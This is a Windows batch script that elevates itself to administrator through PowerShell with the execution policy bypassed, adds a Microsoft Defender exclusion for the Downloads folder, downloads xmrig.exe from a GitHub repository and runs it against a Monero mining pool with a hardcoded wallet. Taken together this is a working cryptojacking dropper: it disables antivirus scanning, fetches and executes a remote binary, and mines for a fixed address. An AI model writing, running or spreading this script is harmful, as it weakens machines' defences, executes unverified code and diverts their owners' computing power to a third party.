@echo off
:: Check for administrative permissions
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Elevating privileges...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList '/c \"\"%~dpnx0\"\"' -Verb RunAs"
    exit /b
)

:: Set working directory to the script's directory
cd /d "%~dp0"

:: Add exclusion
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\user\Downloads'"

:: Download binary (built-in curl on Windows 10/11/Server)
curl -L -o xmrig.exe "https://github.com/iceyfromdiscord/docker/raw/refs/heads/main/xmrig.exe"

:: Execute with pool configuration
xmrig.exe --url pool.supportxmr.com:3333 --user 424trk6WMSt8vygKnjq3EfFw3C3bifZikKqS9vnG71QGGaoaLSTRxgSZeJboHFoiAkKHeprp4QUqz9FEf6p5AzcN5ex3iYL --pass x

pause